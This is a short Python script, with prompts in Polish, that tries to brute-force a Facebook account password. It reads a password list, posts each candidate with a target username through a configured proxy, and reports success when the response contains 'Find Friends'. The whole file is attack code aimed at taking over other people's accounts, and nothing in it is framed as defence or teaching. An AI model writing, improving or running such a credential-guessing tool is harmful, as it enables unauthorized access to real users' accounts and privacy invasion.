import requests

def brute_force(username, fb_id, passwords, proxy):
    for password in passwords:
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}

        data = {
            'email': username,
            'pass': password
        }

        response = session.post(f'https://www.facebook.com/{fb_id}', data=data)

        if 'Find Friends' in response.text:
            print(f'Success! Password found: {password}')
            break

def main():
    username = input('Podaj nazwę użytkownika: ')
    fb_id = input('Podaj identyfikator Facebooka: ')
    password_file = input('Podaj nazw pliku z listą haseł: ')
    proxy = 'http://user123:pass456@192.168.0.1:8080'  # Replace with your proxy details

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    brute_force(username, fb_id, passwords, proxy)

if __name__ == "__main__":
    main()





